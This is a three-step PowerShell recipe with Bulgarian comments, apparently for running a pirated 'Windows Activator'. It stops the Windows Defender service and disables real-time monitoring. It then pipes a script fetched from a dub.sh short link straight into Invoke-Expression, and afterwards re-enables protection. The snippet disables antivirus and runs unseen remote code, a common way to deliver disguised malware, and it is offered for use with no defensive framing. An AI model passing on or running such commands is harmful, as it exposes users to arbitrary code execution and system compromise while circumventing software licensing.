# 1. Спиране на Defender услугите
Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. Пусни активатора
irm https://dub.sh/Windows-Activator | iex

# 3. След 30 секунди, върни защитата
Start-Sleep -Seconds 30
Set-MpPreference -DisableRealtimeMonitoring $false
Start-Service -Name WinDefend -ErrorAction SilentlyContinue
